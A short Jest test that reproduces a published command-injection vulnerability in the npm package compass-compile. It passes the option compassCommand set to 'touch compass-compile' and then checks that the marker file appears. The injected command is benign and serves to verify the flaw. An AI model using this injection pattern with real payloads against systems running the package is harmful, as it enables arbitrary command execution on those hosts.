//https://snyk.io/vuln/SNYK-JS-COMPASSCOMPILE-564429
test("Command Injection in compass-compile", () => {
  const Root = require("compass-compile");
  let root = new Root();
  const fs = require("fs");
  const path = "./compass-compile";
  const sleep = require("sleep");
  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let options = { compassCommand: "touch compass-compile" };
  root.compile(options);
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
